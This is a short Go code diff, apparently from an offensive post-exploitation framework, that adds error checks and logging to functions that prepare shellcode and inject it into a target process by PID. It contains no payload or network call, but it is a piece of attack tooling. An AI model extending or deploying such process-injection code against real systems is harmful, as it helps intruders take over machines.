@@ -142,6 +142,10 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 	}
 	sc := gen_guardian_shellcode(proc_exe)
 
+	if len(sc) == 0 {
+		return "", fmt.Errorf("failed to generate guardian_shellcode")
+	}
+
 	return sc, nil
 }
 
@@ -169,7 +173,12 @@ func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
 		sc = []byte(emp3r0r_data.GuardianShellcode)
 	}
 	shellcode = string(sc)
+	log.Printf("Collected shellcode: %s", shellcode)
 	shellcodeLen = strings.Count(string(shellcode), "0x")
+	if shellcodeLen == 0 {
+		log.Printf("Failed to collect shellcode")
+		return
+	}
 	log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
 	return
 }
@@ -182,6 +191,9 @@ func InjectorHandler(pid int, method string) (err error) {
 
 	case "shellcode":
 		shellcode, _ := prepare_sc(pid)
+		if len(shellcode) == 0 {
+			return fmt.Errorf("failed to prepare shellcode")
+		}
 		err = ShellcodeInjector(&shellcode, pid)
 		if err != nil {
 			return
